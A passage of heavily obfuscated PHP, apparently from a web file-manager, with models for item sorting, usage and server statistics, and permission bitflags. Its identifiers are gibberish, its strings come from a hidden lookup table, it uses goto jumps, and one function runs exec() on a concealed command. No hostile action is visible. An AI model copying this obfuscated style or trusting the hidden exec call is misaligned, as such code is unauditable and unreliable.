array($ÈÇÊÃø´[494] => $‡Ş¡ëş , $ÈÇÊÃø´[558] => $€Ã‹Êõ, $ÈÇÊÃø´[1980] => $this->getSort($ÈÇÊÃø´[335]) + 1); return parent::insert($Ïœ°Ã…); } public function update($ìûÏ¡Ö¼, $øÙ¶óÖ) { $™­Âæ×¬ =& $_SERVER[¿ğÚ‰±–]; $›˜ˆö = $this->listData($ìûÏ¡Ö¼); $½‚“¤ÉŞ = $this->findByName($øÙ¶óÖ[$™­Âæ×¬[32]]); if (!$›˜ˆö || $½‚“¤ÉŞ && $½‚“¤ÉŞ[$™­Âæ×¬[475]] != $›˜ˆö[$™­Âæ×¬[475]]) { return !1; } return parent::update($ìûÏ¡Ö¼, $øÙ¶óÖ); } public function moveTop($Õøù“µ«) { $ Ééß°Ö =& $_SERVER[¿ğÚ‰±–]; $‡¶®¥ê = parent::listData(); $˜‹š‡Î = $this->getSort($ Ééß°Ö[334]); foreach ($‡¶®¥ê as &$Ê††±·ã) { if ($Ê††±·ã[$ Ééß°Ö[475]] == $Õøù“µ«) { $Ê††±·ã[$ Ééß°Ö[2000]] = $˜‹š‡Î; continue; } $Ê††±·ã[$ Ééß°Ö[2000]] += 1; } unset($Ê††±·ã); return parent::resetData($‡¶®¥ê); } public function moveBottom($³çè—´ ) { $‹Î…ˆ° =& $_SERVER[¿ğÚ‰±–]; $™è¿ÎØ = $this->getSort($‹Î…ˆ°[335]) + 1; return parent::update($³çè—´ , array($‹Î…ˆ°[2000] => $™è¿ÎØ)); } public function resetSort($°òÀ°´) { $Š¶òËÃ¶ =& $_SERVER[¿ğÚ‰±–]; $ˆşÑâ™ = array(); $°òÀ°´ = is_array($°òÀ°´) ? $°òÀ°´ : array(); for ($£áÍŒõ = 0; $£áÍŒõ < count($°òÀ°´); $£áÍŒõ++) { $ˆşÑâ™[$°òÀ°´[$£áÍŒõ] . $Š¶òËÃ¶[12]] = $£áÍŒõ + 1; } $ÏŠ”Õš¯ = parent::listData(); foreach ($ÏŠ”Õš¯ as &$üß¾‡”ú) { $Ù¯Éöå¼ = $ˆşÑâ™[$üß¾‡”ú[$Š¶òËÃ¶[475]]]; $üß¾‡”ú[$Š¶òËÃ¶[2000]] = $Ù¯Éöå¼ ? $Ù¯Éöå¼ : $üß¾‡”ú[$Š¶òËÃ¶[2000]]; } unset($üß¾‡”ú); return parent::resetData($ÏŠ”Õš¯); } private function getSort($¼¡¹Ê×¾) { $‚×çŠÈ¥ =& $_SERVER[¿ğÚ‰±–]; $÷˜·˜ = parent::listData(); $¥ÔŠı‹î = array_to_keyvalue($÷˜·˜, $‚×çŠÈ¥[12], $‚×çŠÈ¥[2000]); if (!$¥ÔŠı‹î) { $¥ÔŠı‹î = array(0); } $ôÚŞ‰•ø = $¼¡¹Ê×¾ == $‚×çŠÈ¥[335] ? max($¥ÔŠı‹î) : min($¥ÔŠı‹î); return intval($ôÚŞ‰•ø); } } goto d¨êÌõ„ßÁ; CËŠ‚â¯ö: class AnalysisModel extends ModelBaseLight { public function init($¤ÕİÒû) { $Ã€Ë³Ï =& $_SERVER[¿ğÚ‰±–]; $´Æûà© = array($Ã€Ë³Ï[662] => array($Ã€Ë³Ï[33] => $Ã€Ë³Ï[1904], $Ã€Ë³Ï[350] => array($Ã€Ë³Ï[255], $Ã€Ë³Ï[843], $Ã€Ë³Ï[1905], $Ã€Ë³Ï[1906])), $Ã€Ë³Ï[1907] => array($Ã€Ë³Ï[33] => $Ã€Ë³Ï[1908], $Ã€Ë³Ï[350] => array($Ã€Ë³Ï[255], $Ã€Ë³Ï[841], $Ã€Ë³Ï[1909], $Ã€Ë³Ï[1910], $Ã€Ë³Ï[1911]))); if (!isset($´Æûà©[$¤ÕİÒû])) { return !1; } $this->optionType = $´Æûà©[$¤ÕİÒû][$Ã€Ë³Ï[33]]; $this->field = $´Æûà©[$¤ÕİÒû][$Ã€Ë³Ï[350]]; return !0; } public function listData($şí€ç = false, $…ÂñÍ®« = "\x6d\157\144\x69\146\171\x54\151\x6d\x65", $î½ÁØ“Ì = false) { return parent::listData($şí€ç, $…ÂñÍ®«, $î½ÁØ“Ì); } public function trendList($Ş°™Ş¯«) { $»’¿‚å¥ =& $_SERVER[¿ğÚ‰±–]; $”»÷ßŸ¢ = $this->listData(); if ($”»÷ßŸ¢) { $·Ò³¶í‹ = end($”»÷ßŸ¢); $˜¿©×Í› = date($»’¿‚å¥[1912], strtotime($»’¿‚å¥[1913])); if ($·Ò³¶í‹[$»’¿‚å¥[255]] == $˜¿©×Í›) { return $”»÷ßŸ¢; } $–æô†ÍÀ = strtotime($·Ò³¶í‹[$»’¿‚å¥[255]]); } if (!isset($–æô†ÍÀ)) { $ÀşïÔÁ­ = $Ş°™Ş¯« == $»’¿‚å¥[662] ? $»’¿‚å¥[598] : $»’¿‚å¥[902]; $–æô†ÍÀ = Model($ÀşïÔÁ­)->min($»’¿‚å¥[231]); } $£–æ‚œ = $»’¿‚å¥[1914] . ucfirst($Ş°™Ş¯«); $‹«ñŞ»¤ = $this->dateList($–æô†ÍÀ); foreach ($‹«ñŞ»¤ as $˜¿©×Í›) { $this->{$£–æ‚œ}($˜¿©×Í›); } return $this->listData(); } private function dateList($‘ıØËªÕ) { $Áªœ‹Óá =& $_SERVER[¿ğÚ‰±–]; $¿ç½Ò÷Ô = $‘ıØËªÕ; $Œµœö‰ = strtotime($Áªœ‹Óá[1913]); $âÉû«“ = array(); while ($¿ç½Ò÷Ô <= $Œµœö‰) { $âÉû«“[] = date($Áªœ‹Óá[1912], $¿ç½Ò÷Ô); $¿ç½Ò÷Ô = strtotime($Áªœ‹Óá[1915], $¿ç½Ò÷Ô); } return $âÉû«“; } public function _recordUser($÷ë–½„† = '') { $¿ÉÌï¾Â =& $_SERVER[¿ğÚ‰±–]; $…±ßê˜· = strtotime(date($¿ÉÌï¾Â[1916], strtotime($÷ë–½„†))); $û«ƒ˜™é = strtotime(date($¿ÉÌï¾Â[1917], strtotime($÷ë–½„†))); $ãÙ³Øû = array($¿ÉÌï¾Â[231] => array($¿ÉÌï¾Â[1098], $û«ƒ˜™é)); $üîôğ = Model($¿ÉÌï¾Â[598])->where($ãÙ³Øû)->count($¿ÉÌï¾Â[1777]); $ãÙ³Øû[$¿ÉÌï¾Â[231]] = array($¿ÉÌï¾Â[409], array($…±ßê˜·, $û«ƒ˜™é)); $ÉÚ³¥Áú = Model($¿ÉÌï¾Â[598])->where($ãÙ³Øû)->count($¿ÉÌï¾Â[1777]); $ãÙ³Øû[$¿ÉÌï¾Â[33]] = $¿ÉÌï¾Â[1918]; $°åÁù«ø = Model($¿ÉÌï¾Â[1919])->where($ãÙ³Øû)->count($¿ÉÌï¾Â[1920]); $ã³Ù˜·µ = array($¿ÉÌï¾Â[255] => $÷ë–½„†, $¿ÉÌï¾Â[843] => (int) $üîôğ, $¿ÉÌï¾Â[1905] => (int) $ÉÚ³¥Áú, $¿ÉÌï¾Â[1906] => (int) $°åÁù«ø); return $this->insert($ã³Ù˜·µ); } public function _recordStore($î®µ¶Ä‚ = '') { $ÇÄ³¬» =& $_SERVER[¿ğÚ‰±–]; $îÀşÅ–£ = strtotime(date($ÇÄ³¬»[1917], strtotime($î®µ¶Ä‚))); $Õ÷øËê = array($ÇÄ³¬»[231] => array($ÇÄ³¬»[1098], $îÀşÅ–£)); $¸ƒŞŒŠï = Model($ÇÄ³¬»[544])->where($Õ÷øËê)->sum($ÇÄ³¬»[79]); $Õ÷øËê[$ÇÄ³¬»[485]] = 0; $‘Óû‘æ = Model($ÇÄ³¬»[902])->where($Õ÷øËê)->sum($ÇÄ³¬»[79]); $Õ÷øËê[$ÇÄ³¬»[190]] = 1; $²ıêÖÚ = Model($ÇÄ³¬»[902])->where($Õ÷øËê)->sum($ÇÄ³¬»[79]); $Õ÷øËê[$ÇÄ³¬»[190]] = 2; $»Õš«„„ = Model($ÇÄ³¬»[902])->where($Õ÷øËê)->sum($ÇÄ³¬»[79]); $Õã§ä±° = array($ÇÄ³¬»[255] => $î®µ¶Ä‚, $ÇÄ³¬»[841] => (int) $‘Óû‘æ, $ÇÄ³¬»[1909] => (int) $¸ƒŞŒŠï, $ÇÄ³¬»[1910] => (int) $²ıêÖÚ, $ÇÄ³¬»[1911] => (int) $»Õš«„„); return $this->insert($Õã§ä±°); } public function trend($©°µĞØÔ, $ƒ¯œŠ£) { $Ìûİ³€ =& $_SERVER[¿ğÚ‰±–]; if (!$this->init($©°µĞØÔ)) { return !1; } $şÔÑŸÉ = $this->trendList($©°µĞØÔ); if ($şÔÑŸÉ && $ƒ¯œŠ£ != $Ìûİ³€[1750]) { $ÍùÏÆıÓ = $şÔÑŸÉ[0][$Ìûİ³€[255]]; $¸í­ô = $this->validDate($ƒ¯œŠ£, $ÍùÏÆıÓ); $ÆÇêªÜ‘ = array(); $‰ê”¼ = array_to_keyvalue($şÔÑŸÉ, $Ìûİ³€[255]); foreach ($¸í­ô as $Ú€÷şş¯) { if (isset($‰ê”¼[$Ú€÷şş¯])) { $‡ôÚéÏ = $‰ê”¼[$Ú€÷şş¯]; } else { $‡ôÚéÏ = end($şÔÑŸÉ); $‡ôÚéÏ[$Ìûİ³€[255]] = $Ú€÷şş¯; if ($©°µĞØÔ == $Ìûİ³€[662]) { $‡ôÚéÏ[$Ìûİ³€[1905]] = $‡ôÚéÏ[$Ìûİ³€[1906]] = 0; } } $ÆÇêªÜ‘[] = $‡ôÚéÏ; } $şÔÑŸÉ = $ÆÇêªÜ‘; } $ù ¾ä˜ı = array($Ìûİ³€[662] => array($Ìûİ³€[843] => LNG($Ìûİ³€[1921]), $Ìûİ³€[1905] => LNG($Ìûİ³€[1922]), $Ìûİ³€[1906] => LNG($Ìûİ³€[1923])), $Ìûİ³€[1907] => array($Ìûİ³€[841] => LNG($Ìûİ³€[1924]), $Ìûİ³€[1909] => LNG($Ìûİ³€[1925]), $Ìûİ³€[1910] => LNG($Ìûİ³€[1926]), $Ìûİ³€[1911] => LNG($Ìûİ³€[1927]))); $¯«½Õ³ = array($Ìûİ³€[662] => $Ìûİ³€[1928], $Ìûİ³€[1907] => $Ìûİ³€[79]); if (empty($şÔÑŸÉ)) { $Ú€÷şş¯ = date($Ìûİ³€[1912], strtotime($Ìûİ³€[1913])); $Î°ë§‚¿ = array($Ìûİ³€[255] => $Ú€÷şş¯); foreach ($ù ¾ä˜ı[$©°µĞØÔ] as $úîúúÓå => $¾èµ€èÓ) { $Î°ë§‚¿[$úîúúÓå] = 0; } $şÔÑŸÉ[] = $Î°ë§‚¿; } $Ô—ñµ± = array(); foreach ($şÔÑŸÉ as $¾èµ€èÓ) { if ($©°µĞØÔ == $Ìûİ³€[1907] && $¾èµ€èÓ[$Ìûİ³€[1909]] > $¾èµ€èÓ[$Ìûİ³€[841]]) { $¾èµ€èÓ[$Ìûİ³€[1909]] = $¾èµ€èÓ[$Ìûİ³€[841]]; } foreach ($ù ¾ä˜ı[$©°µĞØÔ] as $úîúúÓå => $ùóˆšÖ×) { $‡ôÚéÏ = array($Ìûİ³€[255] => $¾èµ€èÓ[$Ìûİ³€[255]], $Ìûİ³€[1666] => $ùóˆšÖ×); $‡ôÚéÏ[$¯«½Õ³[$©°µĞØÔ]] = isset($¾èµ€èÓ[$úîúúÓå]) ? $¾èµ€èÓ[$úîúúÓå] : 0; $Ô—ñµ±[] = $‡ôÚéÏ; } } return $Ô—ñµ±; } public function validDate($ƒù¬¡…ê, $áøÒ¨¾É) { $´“¥€»¨ =& $_SERVER[¿ğÚ‰±–]; $ãøİç° = date($´“¥€»¨[1912], strtotime($´“¥€»¨[1913])); $îï×äÄ» = array($ãøİç°); switch ($ƒù¬¡…ê) { case $´“¥€»¨[1757]: $ùŒºÑ‰¶ = mktime(0, 0, 0, date($´“¥€»¨[1929]), date($´“¥€»¨[1456]) - date($´“¥€»¨[1546]) + 7 - 7, date($´“¥€»¨[1930])); $÷«ÅÆ·˜ = 0; do { $…É˜øÇ® = date($´“¥€»¨[1912], $ùŒºÑ‰¶ - 3600 * 24 * 7 * $÷«ÅÆ·˜); $îï×äÄ»[] = $…É˜øÇ®; $÷«ÅÆ·˜++; } while ($áøÒ¨¾É < $…É˜øÇ®); break; case $´“¥€»¨[1755]: $÷«ÅÆ·˜ = 1; do { $Û£’Öµâ = date($´“¥€»¨[1931], strtotime("\55\x20{$÷«ÅÆ·˜}\40\155\157\x6e\x74\150\x73")); $îï×äÄ»[] = $Û£’Öµâ; $÷«ÅÆ·˜++; } while ($áøÒ¨¾É < $Û£’Öµâ); break; case $´“¥€»¨[1932]: $¨èÉËï´ = (int) date($´“¥€»¨[1930], strtotime($áøÒ¨¾É)); $ èëéÌÇ = (int) date($´“¥€»¨[1930]); if ($¨èÉËï´ >= $ èëéÌÇ) { break; } for ($¨èÉËï´; $¨èÉËï´ < $ èëéÌÇ; $¨èÉËï´++) { $îï×äÄ»[] = $¨èÉËï´ . $´“¥€»¨[1933]; } break; default: break; } if ($áøÒ¨¾É > end($îï×äÄ»)) { array_pop($îï×äÄ»); } sort($îï×äÄ»); return $îï×äÄ»; } public function listTable($Ê™öâŸ¡) { $ÁŠÓ‹æ„ = ucfirst($Ê™öâŸ¡); return Model($ÁŠÓ‹æ„)->listData(); } public function option($«áÑĞ) { $ş¥¡Û°ş = $_SERVER[¿ğÚ‰±–][1934] . ucfirst($«áÑĞ); return $this->{$ş¥¡Û°ş}(); } private function optionUser() { $ûğÛ…—â =& $_SERVER[¿ğÚ‰±–]; $¤‹ÖçÜô = Model($ûğÛ…—â[598])->count($ûğÛ…—â[1777]); $Ç©ÉŠô = Model($ûğÛ…—â[598])->where($ûğÛ…—â[1935])->count($ûğÛ…—â[1777]); $Ì€¯‡ÅÕ = intval($GLOBALS[$ûğÛ…—â[6]][$ûğÛ…—â[425]][$ûğÛ…—â[1723]]) / 3600; $ü¹‹’µ› = strtotime("\x2d{$Ì€¯‡ÅÕ}\40\150\x6f\165\x72\x73"); $ñ¤•òì = strtotime(date($ûğÛ…—â[1916])); if ($ü¹‹’µ› < $ñ¤•òì) { $ü¹‹’µ› = $ñ¤•òì; } $«ô¿†ø = array($ûğÛ…—â[1936] => array($ûğÛ…—â[1099], $ü¹‹’µ›)); $‚¬£üÜª = (int) Model($ûğÛ…—â[598])->where($«ô¿†ø)->count($ûğÛ…—â[1777]); if (!$‚¬£üÜª) { $‚¬£üÜª = 1; } $«ô¿†ø = array($ûğÛ…—â[1936] => array($ûğÛ…—â[1099], $ñ¤•òì)); $ºâÔ¦ş = Model($ûğÛ…—â[598])->where($«ô¿†ø)->count($ûğÛ…—â[1777]); return array($ûğÛ…—â[836] => (int) $¤‹ÖçÜô, $ûğÛ…—â[1937] => (int) ($¤‹ÖçÜô - $Ç©ÉŠô), $ûğÛ…—â[1938] => (int) $Ç©ÉŠô, $ûğÛ…—â[1939] => (int) $ºâÔ¦ş, $ûğÛ…—â[1940] => $‚¬£üÜª); } private function optionFile() { $‘è—ÄÆ =& $_SERVER[¿ğÚ‰±–]; $ÜÍÚ‰áŒ = $this->sourceSize(); $²¯‚Ç = $ÜÍÚ‰áŒ[$‘è—ÄÆ[79]]; $ÆæâÓğ– = $ÜÍÚ‰áŒ[$‘è—ÄÆ[1909]]; $°ù¦ç”Ï = Model($‘è—ÄÆ[902])->where(array($‘è—ÄÆ[485] => 0))->count($‘è—ÄÆ[193]); $ĞœÓç„” = array($‘è—ÄÆ[485] => 0, $‘è—ÄÆ[231] => array($‘è—ÄÆ[1099], strtotime(date($‘è—ÄÆ[1916])))); $ÖÄ÷­÷Ñ = Model($‘è—ÄÆ[902])->where($ĞœÓç„”)->sum($‘è—ÄÆ[79]); $¸êí—¡¸ = Model($‘è—ÄÆ[902])->where($ĞœÓç„”)->count($‘è—ÄÆ[193]); return array($‘è—ÄÆ[841] => $²¯‚Ç, $‘è—ÄÆ[1909] => $ÆæâÓğ–, $‘è—ÄÆ[1941] => $²¯‚Ç - $ÆæâÓğ–, $‘è—ÄÆ[1942] => (int) $ÖÄ÷­÷Ñ, $‘è—ÄÆ[843] => (int) $°ù¦ç”Ï, $‘è—ÄÆ[1943] => (int) $¸êí—¡¸); } private function optionAccess() { $²´õ¨ô  =& $_SERVER[¿ğÚ‰±–]; return array($²´õ¨ô [836] => $this->typeLogCnt(), $²´õ¨ô [110] => $this->typeLogCnt($²´õ¨ô [110]), $²´õ¨ô [525] => $this->typeLogCnt($²´õ¨ô [525]), $²´õ¨ô [1944] => $this->typeLogCnt($²´õ¨ô [1944]), $²´õ¨ô [1945] => $this->typeLogCnt($²´õ¨ô [1945]), $²´õ¨ô [662] => $this->typeLogCnt($²´õ¨ô [12], $²´õ¨ô [1920])); } private function typeLogCnt($î­Û€Â = '', $Åúî¡à = "\151\144") { $ÇÚÇ©áè =& $_SERVER[¿ğÚ‰±–]; $ÚÕ¥éÊ = array($ÇÚÇ©áè[110] => array($ÇÚÇ©áè[1946], $ÇÚÇ©áè[1947]), $ÇÚÇ©áè[525] => array($ÇÚÇ©áè[1948], $ÇÚÇ©áè[1949]), $ÇÚÇ©áè[1944] => array($ÇÚÇ©áè[1950], $ÇÚÇ©áè[1951], $ÇÚÇ©áè[1952]), $ÇÚÇ©áè[1945] => array($ÇÚÇ©áè[1953], $ÇÚÇ©áè[1954]), $ÇÚÇ©áè[1955] => array($ÇÚÇ©áè[1956], $ÇÚÇ©áè[1957], $ÇÚÇ©áè[1958])); $‰ÅÆµÌ“ = strtotime(date($ÇÚÇ©áè[1916])); $‰¨ÏÅÛ = array($ÇÚÇ©áè[231] => array($ÇÚÇ©áè[1099], $‰ÅÆµÌ“)); if ($î­Û€Â) { $‰¨ÏÅÛ[$ÇÚÇ©áè[33]] = array($ÇÚÇ©áè[7], $ÚÕ¥éÊ[$î­Û€Â]); } $×ğõ¥ÅÍ = Model($ÇÚÇ©áè[1919])->where($‰¨ÏÅÛ)->count($Åúî¡à); return (int) $×ğõ¥ÅÍ; } private function optionServer() { $´ÔÖ“Û€ =& $_SERVER[¿ğÚ‰±–]; $­óç…»Ì = $this->diskDriver(); $İç›”´‘ = KodIO::defaultDriver(); $ïÍ¹Èì• = array($´ÔÖ“Û€[895] => $İç›”´‘[$´ÔÖ“Û€[475]]); $ÓÕ©ÒÅ = Model($´ÔÖ“Û€[544])->where($ïÍ¹Èì•)->sum($´ÔÖ“Û€[79]); $Ó‚¼Ï€ = explode($´ÔÖ“Û€[53], $_SERVER[$´ÔÖ“Û€[147]]); $òªéíÈ± = $Ó‚¼Ï€[0]; $ô›õøáÄ = $GLOBALS[$´ÔÖ“Û€[6]][$´ÔÖ“Û€[21]]; $ü¥šë˜Ó = $ô›õøáÄ[$´ÔÖ“Û€[1061]]; if ($ü¥šë˜Ó == $´ÔÖ“Û€[1049]) { $ØêØ¤ = explode($´ÔÖ“Û€[1375], $ô›õøáÄ[$´ÔÖ“Û€[1060]]); $ü¥šë˜Ó = $ØêØ¤[0]; } if ($ü¥šë˜Ó == $´ÔÖ“Û€[997] || $ü¥šë˜Ó == $´ÔÖ“Û€[882]) { $ÀîâØ¨ñ = Model()->db()->query($´ÔÖ“Û€[1959]); $•ªÍÁ¦ = $ÀîâØ¨ñ[0] && isset($ÀîâØ¨ñ[0][$´ÔÖ“Û€[1665]]) ? $ÀîâØ¨ñ[0][$´ÔÖ“Û€[1665]] : 0; $ü¥šë˜Ó = $´ÔÖ“Û€[1960] . ($•ªÍÁ¦ ? $´ÔÖ“Û€[8] . $•ªÍÁ¦ : $´ÔÖ“Û€[12]); } $µĞ×„ó = $GLOBALS[$´ÔÖ“Û€[6]][$´ÔÖ“Û€[425]][$´ÔÖ“Û€[904]]; return array($´ÔÖ“Û€[1961] => $­óç…»Ì ? $­óç…»Ì[$´ÔÖ“Û€[1962]] : 0, $´ÔÖ“Û€[1963] => $­óç…»Ì ? $­óç…»Ì[$´ÔÖ“Û€[1964]] : 0, $´ÔÖ“Û€[1965] => (int) $İç›”´‘[$´ÔÖ“Û€[1962]] * 1024 * 1024 * 1024, $´ÔÖ“Û€[1966] => (int) $ÓÕ©ÒÅ, $´ÔÖ“Û€[1967] => ucfirst($òªéíÈ±), $´ÔÖ“Û€[1968] => $´ÔÖ“Û€[1969] . PHP_VERSION, $´ÔÖ“Û€[1970] => phpBuild64() ? 64 : 32, $´ÔÖ“Û€[835] => str_replace($´ÔÖ“Û€[1218], $´ÔÖ“Û€[1077], $ü¥šë˜Ó), $´ÔÖ“Û€[425] => ucfirst($µĞ×„ó), $´ÔÖ“Û€[32] => $_SERVER[$´ÔÖ“Û€[1971]]); } private function diskDriver() { $¤Ó¢İ¸™ =& $_SERVER[¿ğÚ‰±–]; $ÔìèÌ† = $¤Ó¢İ¸™[8]; $ñÑ—ØáÑ = $GLOBALS[$¤Ó¢İ¸™[6]][$¤Ó¢İ¸™[1392]] == $¤Ó¢İ¸™[1393]; if ($ñÑ—ØáÑ) { $ÔìèÌ† = $¤Ó¢İ¸™[1972]; if (function_exists($¤Ó¢İ¸™[1973])) { exec($¤Ó¢İ¸™[1974], $ç§ÕÆ£¥); $ÔìèÌ† = $ç§ÕÆ£¥[1] . $¤Ó¢İ¸™[8]; } } if (!file_exists($ÔìèÌ†)) { return; } if (!function_exists($¤Ó¢İ¸™[1975])) { return; } $³™ğ±‰¢ = @disk_total_space($ÔìèÌ†); $¨ÚªÉŞ´ = $³™ğ±‰¢ - @disk_free_space($ÔìèÌ†); return array($¤Ó¢İ¸™[1962] => $³™ğ±‰¢, $¤Ó¢İ¸™[1964] => $¨ÚªÉŞ´); } public function fileChart($‡ş¥ì¿¦) { $¦İéúã» =& $_SERVER[¿ğÚ‰±–]; if (isset($‡ş¥ì¿¦[$¦İéúã»[1777]])) { return Model($¦İéúã»[902])->userFileTypeProfile($‡ş¥ì¿¦[$¦İéúã»[1777]]); } if (isset($‡ş¥ì¿¦[$¦İéúã»[1976]])) { return Model($¦İéúã»[902])->groupFileTypeProfile($‡ş¥ì¿¦[$¦İéúã»[1976]]); } $Â¥ï›• = $this->sourceSize(); $ë†ı½Û = array($¦İéúã»[192] => 0, $¦İéúã»[190] => 1); $Å˜Ş˜½® = Model($¦İéúã»[902])->where($ë†ı½Û)->sum($¦İéúã»[79]); $ë†ı½Û[$¦İéúã»[190]] = 2; $äñçÛƒ = Model($¦İéúã»[902])->where($ë†ı½Û)->sum($¦İéúã»[79]); return array($¦İéúã»[841] => $Â¥ï›•[$¦İéúã»[79]], $¦İéúã»[1909] => $Â¥ï›•[$¦İéúã»[1909]], $¦İéúã»[1910] => (int) $Å˜Ş˜½®, $¦İéúã»[1911] => (int) $äñçÛƒ); } private function sourceSize() { $‡Ç¤ÓÚ =& $_SERVER[¿ğÚ‰±–]; $ñ“ãı‰Û = Model($‡Ç¤ÓÚ[902])->where(array($‡Ç¤ÓÚ[485] => 0))->sum($‡Ç¤ÓÚ[79]); $÷¿­œòö = Model($‡Ç¤ÓÚ[544])->sum($‡Ç¤ÓÚ[79]); if ($÷¿­œòö > $ñ“ãı‰Û) { $÷¿­œòö = $ñ“ãı‰Û; } return array($‡Ç¤ÓÚ[79] => (int) $ñ“ãı‰Û, $‡Ç¤ÓÚ[1909] => (int) $÷¿­œòö); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Ã¡Œ¿Ğâ =& $_SERVER[¿ğÚ‰±–]; $æ¬È˜á§ = array(array($Ã¡Œ¿Ğâ[494] => LNG($Ã¡Œ¿Ğâ[1977]), $Ã¡Œ¿Ğâ[1978] => $Ã¡Œ¿Ğâ[1979], $Ã¡Œ¿Ğâ[1980] => 1, $Ã¡Œ¿Ğâ[1981] => 1, $Ã¡Œ¿Ğâ[1982] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ã¡Œ¿Ğâ[494] => LNG($Ã¡Œ¿Ğâ[1983]), $Ã¡Œ¿Ğâ[1978] => $Ã¡Œ¿Ğâ[1984], $Ã¡Œ¿Ğâ[1980] => 2, $Ã¡Œ¿Ğâ[1981] => 1, $Ã¡Œ¿Ğâ[1982] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ã¡Œ¿Ğâ[494] => LNG($Ã¡Œ¿Ğâ[1985]), $Ã¡Œ¿Ğâ[1978] => $Ã¡Œ¿Ğâ[1986], $Ã¡Œ¿Ğâ[1980] => 3, $Ã¡Œ¿Ğâ[1981] => 1, $Ã¡Œ¿Ğâ[1982] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Ã¡Œ¿Ğâ[494] => LNG($Ã¡Œ¿Ğâ[1987]), $Ã¡Œ¿Ğâ[1978] => $Ã¡Œ¿Ğâ[1988], $Ã¡Œ¿Ğâ[1980] => 4, $Ã¡Œ¿Ğâ[1981] => 1, $Ã¡Œ¿Ğâ[1982] => self::AUTH_SHOW | self::AUTH_VIEW), array($Ã¡Œ¿Ğâ[494] => LNG($Ã¡Œ¿Ğâ[1989]), $Ã¡Œ¿Ğâ[1978] => $Ã¡Œ¿Ğâ[1990], $Ã¡Œ¿Ğâ[1980] => 5, $Ã¡Œ¿Ğâ[1981] => 1, $Ã¡Œ¿Ğâ[1982] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Ã¡Œ¿Ğâ[494] => LNG($Ã¡Œ¿Ğâ[1991]), $Ã¡Œ¿Ğâ[1978] => $Ã¡Œ¿Ğâ[1992], $Ã¡Œ¿Ğâ[1980] => 6, $Ã¡Œ¿Ğâ[1981] => 1, $Ã¡Œ¿Ğâ[1982] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Ã¡Œ¿Ğâ[494] => LNG($Ã¡Œ¿Ğâ[1993]), $Ã¡Œ¿Ğâ[1978] => $Ã¡Œ¿Ğâ[1994], $Ã¡Œ¿Ğâ[1980] => 7, $Ã¡Œ¿Ğâ[1981] => 1, $Ã¡Œ¿Ğâ[1982] => 0)); return $æ¬È˜á§; } public static function authCheck($¶´ñêú, $›¦ó×©½) { $ñöõÏš® =& $_SERVER[¿ğÚ‰±–]; $¶´ñêú = intval($¶´ñêú); if (KodUser::isRoot() && $GLOBALS[$ñöõÏš®[6]][$ñöõÏš®[1995]]) { return !0; } if ($¶´ñêú <= 0) { return !1; } if (($¶´ñêú & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¶´ñêú & $›¦ó×©½); } public static function authCheckShow($ÅèÜ‰Œİ) { return self::authCheck($ÅèÜ‰Œİ, self::AUTH_SHOW); } public static function authCheckView($øâ¸®) { return self::authCheck($øâ¸®, self::AUTH_VIEW); } public static function authCheckDownload($İ¯§›š…) { return self::authCheck($İ¯§›š…, self::AUTH_DOWNLOAD); } public static function authCheckUpload($šõèæ™ì) { return self::authCheck($šõèæ™ì, self::AUTH_UPLOAD); } public static function authCheckEdit($Ä²É°ÊŞ) { return self::authCheck($Ä²É°ÊŞ, self::AUTH_EDIT); } public static function authCheckRemove($Åûùê§£) { return self::authCheck($Åûùê§£, self::AUTH_REMOVE); } public static function authCheckShare($®í‹È) { return self::authCheck($®í‹È, self::AUTH_SHARE); } public static function authCheckComment($ÛàŸ¢) { return self::authCheck($ÛàŸ¢, self::AUTH_COMMENT); } public static function authCheckEvent($¨¼åòî‡) { return self::authCheck($¨¼åòî‡, self::AUTH_EVENT); } public static function authCheckRoot($Ş»ÕÊœÇ) { return self::authCheck($Ş»ÕÊœÇ, self::AUTH_ROOT); } public static function authCheckAction($êéĞ…®², $³Îäµ) { $Š´™·½ =& $_SERVER[¿ğÚ‰±–]; $”ÚÄ‚„Æ = array($Š´™·½[1996] => self::AUTH_VIEW, $Š´™·½[1286] => self::AUTH_DOWNLOAD, $Š´™·½[110] => self::AUTH_UPLOAD, $Š´™·½[1945] => self::AUTH_EDIT, $Š´™·½[1944] => self::AUTH_REMOVE, $Š´™·½[1955] => self::AUTH_SHARE, $Š´™·½[430] => self::AUTH_COMMENT, $Š´™·½[1765] => self::AUTH_EVENT, $Š´™·½[1997] => self::AUTH_ROOT); if (!isset($”ÚÄ‚„Æ[$³Îäµ])) { return; } $Û”ï·œ× = $”ÚÄ‚„Æ[$³Îäµ]; $êéĞ…®² = intval($êéĞ…®²); if ($êéĞ…®² <= 0) { return !1; } if (($êéĞ…®² & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($êéĞ…®² & $Û”ï·œ×); } public static function authDisable($Óş³şÛó, $®–Ÿêäã) { if (intval($Óş³şÛó) <= 0) { return 0; } return intval($Óş³şÛó) & ~$®–Ÿêäã; } public $optionType = "\123\171\x73\164\145\x6d\x2e\163\157\x75\x72\143\145\101\x75\x74\150\x4c\x69\163\x74"; public 